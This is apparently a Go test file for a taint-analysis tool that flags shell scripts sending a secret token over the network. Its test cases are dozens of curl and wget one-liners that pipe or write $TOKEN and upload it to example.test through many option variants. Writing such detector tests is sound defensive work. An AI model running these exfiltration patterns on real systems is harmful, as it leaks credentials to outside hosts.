package taint

import (
	"testing"

	"github.com/stretchr/testify/require"
)

func TestShellNetworkFileSources(t *testing.T) {
	for _, tt := range []struct {
		name, run string
	}{
		{"inline variable stdin upload", `INPUT=-; printf '%s' "$TOKEN" | curl --upload-file="$INPUT" https://example.test`},
		{"inline variable nonblocking stdin upload", `INPUT=.; printf '%s' "$TOKEN" | curl --upload-file="$INPUT" https://example.test`},
		{"inline variable tracked upload", `INPUT=payload; printf '%s' "$TOKEN" > "$INPUT"; curl --upload-file="$INPUT" https://example.test`},
		{"inline variable wget upload", `INPUT=payload; printf '%s' "$TOKEN" > "$INPUT"; wget --post-file="$INPUT" https://example.test`},
		{"separate file header", `printf 'X-Data: %s\n' "$TOKEN" > headers; curl -H @headers https://example.test`},
		{"inline file header", `printf 'X-Data: %s\n' "$TOKEN" > headers; curl --header=@headers https://example.test`},
		{"separate stdin header", `printf 'X-Data: %s\n' "$TOKEN" | curl --header @- https://example.test`},
		{"inline stdin header", `printf 'X-Data: %s\n' "$TOKEN" | curl --header=@- https://example.test`},
		{"variable file header", `INPUT=@headers; printf 'X-Data: %s\n' "$TOKEN" > headers; curl -H "$INPUT" https://example.test`},
		{"inline variable file header", `INPUT=headers; printf 'X-Data: %s\n' "$TOKEN" > headers; curl --header=@"$INPUT" https://example.test`},
		{"variable stdin header", `INPUT=@-; printf 'X-Data: %s\n' "$TOKEN" | curl --header="$INPUT" https://example.test`},
		{"form file contents", `printf '%s' "$TOKEN" > payload; curl -F 'text=<payload' https://example.test`},
		{"form file upload", `printf '%s' "$TOKEN" > payload; curl --form 'text=@payload' https://example.test`},
		{"inline form file contents", `printf '%s' "$TOKEN" > payload; curl --form='text=<payload' https://example.test`},
		{"inline form file upload", `printf '%s' "$TOKEN" > payload; curl --form='text=@payload;type=text/plain' https://example.test`},
		{"form file with quoted metadata", `printf '%s' "$TOKEN" > payload; curl -F 'text=@payload;filename="public.txt"' https://example.test`},
		{"form stdin contents", `printf '%s' "$TOKEN" | curl -F 'text=<-' https://example.test`},
		{"inline form stdin upload", `printf '%s' "$TOKEN" | curl --form='text=@-' https://example.test`},
		{"variable form filename", `INPUT=payload; printf '%s' "$TOKEN" > payload; curl -F "text=<$INPUT" https://example.test`},
		{"variable form operand", `INPUT='text=@-'; printf '%s' "$TOKEN" | curl --form="$INPUT" https://example.test`},
		{"form multiple uploads", `printf '%s' "$TOKEN" > payload; curl -F 'text=@public,payload' https://example.test`},
		{"urlencoded file contents", `printf '%s' "$TOKEN" > payload; curl --data-urlencode 'text@payload' https://example.test`},
		{"inline urlencoded file contents", `printf '%s' "$TOKEN" > payload; curl --data-urlencode='text@payload' https://example.test`},
		{"urlencoded unnamed file contents", `printf '%s' "$TOKEN" > payload; curl --data-urlencode @payload https://example.test`},
		{"urlencoded stdin contents", `printf '%s' "$TOKEN" | curl --data-urlencode 'text@-' https://example.test`},
		{"inline urlencoded stdin contents", `printf '%s' "$TOKEN" | curl --data-urlencode=@- https://example.test`},
		{"urlencoded filename containing equals", `printf '%s' "$TOKEN" > 'payload=one'; curl --data-urlencode 'text@payload=one' https://example.test`},
		{"variable urlencoded filename", `INPUT=payload; printf '%s' "$TOKEN" > payload; curl --data-urlencode="text@$INPUT" https://example.test`},
		{"variable data operand", `INPUT=@payload; printf '%s' "$TOKEN" > payload; curl --data-binary "$INPUT" https://example.test`},
		{"variable inline data stdin", `INPUT=@-; printf '%s' "$TOKEN" | curl --data="$INPUT" https://example.test`},
		{"data filename containing equals", `printf '%s' "$TOKEN" > 'payload=one'; curl --data-binary '@payload=one' https://example.test`},
		{"inline data filename containing equals", `printf '%s' "$TOKEN" > 'payload=one'; curl --data-binary='@payload=one' https://example.test`},
	} {
		t.Run(tt.name, func(t *testing.T) {
			result := checkSecretScript(t, tt.run)
			require.Empty(t, result.Gaps)
			require.Len(t, result.Findings, 1, "%+v", result.Findings)
			require.Equal(t, Network, result.Findings[0].Site.Kind)
		})
	}
}

func TestShellNetworkLiteralOperands(t *testing.T) {
	for _, run := range []string{
		`curl --data-raw @payload https://example.test`,
		`curl --data-raw=@payload https://example.test`,
		`curl --form-string 'text=@payload' https://example.test`,
		`curl --form-string='text=<payload' https://example.test`,
		`curl --data-urlencode 'text=@payload' https://example.test`,
		`curl --data-urlencode='text=literal@payload' https://example.test`,
		`curl --data 'text=@payload' https://example.test`,
		`curl --data-binary='text=@payload' https://example.test`,
		`curl --json='text=@payload' https://example.test`,
		`curl -F 'text=literal@payload' https://example.test`,
		`curl --form='text=literal<payload' https://example.test`,
		`curl -H 'X-Data: @payload' https://example.test`,
		`curl --header='X-Data: @payload' https://example.test`,
		`INPUT=-; printf '%s' "$TOKEN" | wget --post-file="$INPUT" https://example.test`,
		`INPUT=.; printf '%s' "$TOKEN" | wget --post-file="$INPUT" https://example.test`,
		`printf '%s' "$TOKEN" | curl --data-binary @. https://example.test`,
		`printf '%s' "$TOKEN" | curl --header=@. https://example.test`,
	} {
		t.Run(run, func(t *testing.T) {
			result := checkSecretScript(t, `printf '%s' "$TOKEN" > payload; `+run)
			require.Empty(t, result.Gaps)
			require.Empty(t, result.Findings)
		})
	}
	for _, option := range []string{"--data-raw", "--form-string"} {
		result := checkSecretScript(t, `curl `+option+` "$TOKEN" https://example.test`)
		require.Empty(t, result.Gaps)
		require.Len(t, result.Findings, 1)
		require.Equal(t, Network, result.Findings[0].Site.Kind)
	}
}

func TestShellNetworkUnknownFileSources(t *testing.T) {
	for _, operand := range []string{
		`--upload-file="$UNKNOWN"`,
		`--post-file="$UNKNOWN"`,
		`-H @"$UNKNOWN"`,
		`--header=@"$UNKNOWN"`,
		`--header="$UNKNOWN"`,
		`-F "text=<$UNKNOWN"`,
		`--form="text=@$UNKNOWN"`,
		`--data-urlencode="text@$UNKNOWN"`,
		`--data-binary="$UNKNOWN"`,
		`--upload-file="["`,
	} {
		t.Run(operand, func(t *testing.T) {
			result := checkSecretScript(t, `printf '%s' "$TOKEN" > payload; curl `+operand+` https://example.test`)
			require.Len(t, result.Gaps, 1)
			require.Contains(t, result.Gaps[0].Reason, "dynamic network upload")
			require.Empty(t, result.Findings)
		})
	}
	for _, operand := range []string{`--upload-file="$INPUT"`, `--header=@"$INPUT"`, `--form="text=<$INPUT"`, `--data-urlencode="text@$INPUT"`} {
		t.Run("partially known "+operand, func(t *testing.T) {
			result := checkSecretScript(t, `if true; then INPUT=-; else INPUT="$UNKNOWN"; fi; printf '%s' "$TOKEN" | curl `+operand+` https://example.test`)
			require.Len(t, result.Gaps, 1)
			require.Len(t, result.Findings, 1)
			require.Equal(t, Network, result.Findings[0].Site.Kind)
		})
	}
	result := checkSecretScript(t, `printf '%s' "$TOKEN" > payload; curl -F 'text=@"payload"' https://example.test`)
	require.Len(t, result.Gaps, 1)
	require.Contains(t, result.Gaps[0].Reason, "quoted multipart")
}

func TestWgetHeadersDoNotReadFilesOrStdin(t *testing.T) {
	for _, operand := range []string{
		`--header=@headers`,
		`--header @headers`,
		`--header=@-`,
		`--header @-`,
		`--header=@"$UNKNOWN"`,
	} {
		t.Run(operand, func(t *testing.T) {
			result := checkSecretScript(t, `printf 'X-Data: %s\n' "$TOKEN" > headers; printf 'X-Data: %s\n' "$TOKEN" | wget `+operand+` https://example.test`)
			require.Empty(t, result.Findings)
			require.Empty(t, result.Gaps)
		})
	}
	for _, operand := range []string{`--header="X-Data: $TOKEN"`, `--header "X-Data: $TOKEN"`} {
		t.Run(operand, func(t *testing.T) {
			result := checkSecretScript(t, `wget `+operand+` https://example.test`)
			require.Empty(t, result.Gaps)
			require.Len(t, result.Findings, 1)
			require.Equal(t, Network, result.Findings[0].Site.Kind)
		})
	}
}
